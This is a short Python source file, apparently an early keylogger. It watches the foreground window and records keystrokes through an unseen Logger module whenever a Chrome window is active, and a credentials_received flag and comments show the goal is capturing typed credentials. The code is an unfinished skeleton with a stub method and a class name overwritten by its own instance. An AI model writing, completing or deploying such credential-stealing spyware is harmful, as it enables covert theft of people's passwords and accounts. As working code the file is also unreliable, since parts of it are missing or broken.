import re
from win32gui import GetWindowText, GetForegroundWindow
from threading import Thread
from pynput import keyboard
import Logger

class Main:
    def __init__(self):
        # reg ex stuff
        self.chrome = re.compile(r'chrome', re.IGNORECASE)
        self.log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
        #self.logger = Logger.Logger(self.log_file)
        self.logger = Logger.Logger()
        self.credentials_received = False
    
    def run_keylogger(self):
        curr_app = GetWindowText(GetForegroundWindow())
        
        # keylogger loop
        while(1):
            while(bool(self.chrome.search(curr_app))): 
                self.logger.startReading(self.doStuff())
                self.logger.stopReading()
                
                #self.logger.log_keystrokes()
                
                # TODO: analysis, when do i break?
                #self.credentials_received = True
                #if(self.credentials_received):
                #    break
                
                curr_app = GetWindowText(GetForegroundWindow())
            
            if(self.credentials_received):
                break
            
            curr_app = GetWindowText(GetForegroundWindow())
    def doStuff(self):
        return
    
if __name__ == "__main__":
    Main = Main()
    Main.run_keylogger()
